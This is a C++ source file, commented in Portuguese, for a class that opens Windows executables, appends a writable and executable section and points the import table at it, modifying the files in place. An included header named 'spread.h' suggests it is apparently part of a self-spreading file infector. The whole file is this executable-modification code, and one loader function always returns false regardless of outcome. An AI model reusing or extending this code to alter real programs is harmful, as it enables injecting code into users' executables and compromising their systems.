#include "..\common\spread.h"


CPEManipulator::CPEManipulator( char* FilePath )
{
	if ( FilePath ) 
	{
		LoadBufferFromFile( FilePath );
	}
}

CPEManipulator::~CPEManipulator()
{
	// Libera buffer da memoria
	DeleteFileMemObj( &m_FileMemObj );
}

bool CPEManipulator::LoadBufferFromFile( char* FilePath )
{
    m_IsValidPE = false;

	if ( FilePath == NULL ) 
	{
		return false;
	}

	try
	{
		if ( CreateFileMemObj( FilePath, &m_FileMemObj ) )
		{
			// Recebe o Dos Header
			m_pDosHeader = (PIMAGE_DOS_HEADER) m_FileMemObj.lpMo;

			if ( ! IsBadReadPtr( m_pDosHeader, sizeof( IMAGE_DOS_HEADER ) ) )
			{
				if ( m_pDosHeader->e_magic == IMAGE_DOS_SIGNATURE )
				{
					// Recebe o PE Header
					m_pNtHeaders = MakePtr( PIMAGE_NT_HEADERS, m_pDosHeader, m_pDosHeader->e_lfanew );

					if ( ! IsBadReadPtr( m_pNtHeaders, sizeof( IMAGE_NT_HEADERS ) ) )
					{
						if ( m_pNtHeaders->Signature == IMAGE_NT_SIGNATURE )
						{
							// Recebe a primeira secao
							m_pSectionHeader = IMAGE_FIRST_SECTION( m_pNtHeaders );

							// Recebe o endereco da tabela de importacao
							m_ImportTableRVA = m_pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

							if ( m_ImportTableRVA > 0 ) 
							{
								// É um arquivo PE valido
								m_IsValidPE = true;
							}
						}
					}
				}
			}
		}
	}
	catch(...)
	{
	}

	return false;
}

void CPEManipulator::Align( DWORD &Value, int AlignType )
{
    DWORD dwTemp;
	
    dwTemp = Value / AlignType;

    if ( dwTemp * AlignType != Value )
    {
        Value = ( dwTemp + 1 ) * AlignType;
    }
}

bool CPEManipulator::InsertNewSection( int DataSize, char* SectionName, IMAGE_SECTION_HEADER* NewSectionOut )
{
	try
	{
		// Recebe o tamanho do novo Section Header
		int NewSectionHeaderSize = sizeof( IMAGE_SECTION_HEADER ) * ( m_pNtHeaders->FileHeader.NumberOfSections + 1 );
	
		// Grava todos os Sections Headers
		IMAGE_SECTION_HEADER* NewSectionHeader = (IMAGE_SECTION_HEADER *) malloc( NewSectionHeaderSize );

		// Zera toda a estrutura
		memset( NewSectionHeader, 0, NewSectionHeaderSize );

		// Copia secoes ja existentes na estrutura
		memcpy( NewSectionHeader, m_pSectionHeader, NewSectionHeaderSize - sizeof( IMAGE_SECTION_HEADER ) );

		// Pega os dados da ultima 
		IMAGE_SECTION_HEADER SectionTemp = NewSectionHeader[ m_pNtHeaders->FileHeader.NumberOfSections - 1 ];
		IMAGE_SECTION_HEADER* LastSection = &NewSectionHeader[ m_pNtHeaders->FileHeader.NumberOfSections - 1 ];

		// Joga dados para a estrutura da nova secao
		memset( &SectionTemp, 0, sizeof( IMAGE_SECTION_HEADER ) );
		memcpy( &SectionTemp.Name, SectionName, strlen( SectionName ) );

		SectionTemp.Characteristics = IMAGE_SCN_CNT_CODE |
			                          IMAGE_SCN_MEM_EXECUTE |
 			                          IMAGE_SCN_CNT_INITIALIZED_DATA | 
			                          IMAGE_SCN_MEM_READ | 
									  IMAGE_SCN_MEM_WRITE;

		// Checagem especial somente para programas compilados com Watcom C
		if ( LastSection->Misc.VirtualSize == 0 )
		{
		    SectionTemp.VirtualAddress = LastSection->VirtualAddress + 
                                         LastSection->SizeOfRawData;

			Align( SectionTemp.VirtualAddress, m_pNtHeaders->OptionalHeader.SectionAlignment );
		}
		else
		{
			SectionTemp.VirtualAddress = LastSection->VirtualAddress + 
                                         LastSection->Misc.VirtualSize;	

			Align( SectionTemp.VirtualAddress, m_pNtHeaders->OptionalHeader.SectionAlignment );
		}

		// Calcula tamanho dos dados e ja alinha
		SectionTemp.SizeOfRawData = DataSize;
		Align( SectionTemp.SizeOfRawData, m_pNtHeaders->OptionalHeader.FileAlignment );

		// Calcula Tamanho virtual
		SectionTemp.Misc.VirtualSize = DataSize;
		Align( SectionTemp.Misc.VirtualSize, m_pNtHeaders->OptionalHeader.SectionAlignment );

		// Calcula offset para os dados
		SectionTemp.PointerToRawData = LastSection->PointerToRawData + LastSection->SizeOfRawData;
		Align( SectionTemp.PointerToRawData, m_pNtHeaders->OptionalHeader.FileAlignment );

		// Calcula novos dados do PE Header
		IMAGE_NT_HEADERS NewNTHeader = *m_pNtHeaders;

		// Tamanho da imagem
		NewNTHeader.OptionalHeader.SizeOfImage += SectionTemp.Misc.VirtualSize;
		Align( NewNTHeader.OptionalHeader.SizeOfImage, m_pNtHeaders->OptionalHeader.SectionAlignment );

		// Atualiza numero de secoes
		NewNTHeader.FileHeader.NumberOfSections++;
		// Recebe VirtualAddress da tabela de importacao
		NewNTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = SectionTemp.VirtualAddress;

		// Zerar estes dados, pois alguns erros acontecem em alguns
		// executaveis do Windows 2000, como o NOTEPAD.EXE e o CALC.EXE
		NewNTHeader.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT ].Size = 0;
		NewNTHeader.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT ].VirtualAddress = 0;

		// Joga dados da nova secao para junto com as outras meninas
		memcpy( &NewSectionHeader[NewNTHeader.FileHeader.NumberOfSections - 1], &SectionTemp, sizeof( IMAGE_SECTION_HEADER ) );

        WriteData( m_pDosHeader->e_lfanew, &NewNTHeader, sizeof( IMAGE_NT_HEADERS ) );
			
		// Grava cabecalho das secoes
        WriteData( m_pDosHeader->e_lfanew + sizeof( IMAGE_NT_HEADERS ),
				   NewSectionHeader, 
				   NewSectionHeaderSize );

		// Joga dados da secao para uma variavel global para ser usada depois
		memcpy( NewSectionOut, &SectionTemp, sizeof( IMAGE_SECTION_HEADER ) );

		// Libera memoria
		free(NewSectionHeader);

		// Tudo certo
		return true;
	}
	catch(...)
	{
	}

	return false;
}

void CPEManipulator::WriteData( DWORD offset, void* Buffer, int DataSize )
{
    unsigned char *BufferOffset = (unsigned char *) m_FileMemObj.lpMo;

	try
	{
		if ( offset < m_FileSize )
		{
           memcpy( &BufferOffset[ offset ], Buffer, DataSize ); 
		}
		else
		{
           DWORD Size = 0;

		   SetFilePointer( m_FileMemObj.hFile, 0, NULL, FILE_END );
           WriteFile( m_FileMemObj.hFile, Buffer, DataSize, &Size, NULL );
		}
	}
	catch(...)
	{
	}
}

bool CPEManipulator::SectionExists( char *SectionName )
{
    try
    {
		// Pega algumas informacoes sobre o arquivo PE
        int ObjectCount = m_pNtHeaders->FileHeader.NumberOfSections;

        for ( int i = 0; i < ObjectCount; i++ )
		{
            // Eh a secao que estamos procurando ?
            if ( stricmp( (const char *) m_pSectionHeader[ i ].Name, SectionName ) == 0 )
			{ 
               return true;
			}
		}
	}
    catch(...)
    {
    }

    return false;
}

bool CPEManipulator::CreateFileMemObj( char* FilePath, TFileMemObj* FileMemObj )
{
    HANDLE hMo = NULL;
    void*  lpMo = NULL;
    HANDLE hFile = NULL;

    m_FileSize = 0;

    try
    {
        // Abre arquivo
        hFile = CreateFile( FilePath,
                            GENERIC_READ | GENERIC_WRITE,
                            0,  //FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL,
							OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, 
                            NULL );

        if ( hFile != INVALID_HANDLE_VALUE )
        {
			m_FileSize = GetFileSize( hFile, NULL );
            
			hMo = CreateFileMapping( hFile, NULL, PAGE_READWRITE, 0, 0, NULL );
            
			if ( hMo )
            {
                lpMo = MapViewOfFile( hMo, FILE_MAP_ALL_ACCESS, 0, 0, 0 );
                
				if ( lpMo )
                {
                    if ( FileMemObj )
                    {
                        FileMemObj->hFile = hFile;
                        FileMemObj->hMo = hMo;
                        FileMemObj->lpMo = lpMo;

                        return true;
                    }
                }
            }
        }
    }
    catch( ... )
    {
    }

    // Se chegou aqui eh porque deu pau... fecha handles
    if ( lpMo )
    {
        UnmapViewOfFile( lpMo );
		lpMo = NULL;
    }

	if ( hMo )
	{
        CloseHandle( hMo );
	    hMo = NULL;
	}

	if ( hFile )
	{
        CloseHandle( hFile );
	    hFile = NULL;
	}

    return false;
}

bool CPEManipulator::DeleteFileMemObj( TFileMemObj* FileMemObj )
{
    try
    {
        if ( FileMemObj )
        {
            if ( FileMemObj->lpMo )
            {
                if ( UnmapViewOfFile( FileMemObj->lpMo ) )
                {
                    if ( FileMemObj->hMo )
                    {
                        if ( CloseHandle( FileMemObj->hMo ) )
                        {
                            if ( CloseHandle( FileMemObj->hFile ) )
                            {
                                return true;
                            }
                        }
                    }
                }
            }
        }
    }
    catch( ... )
    {
    }

    return false;
}
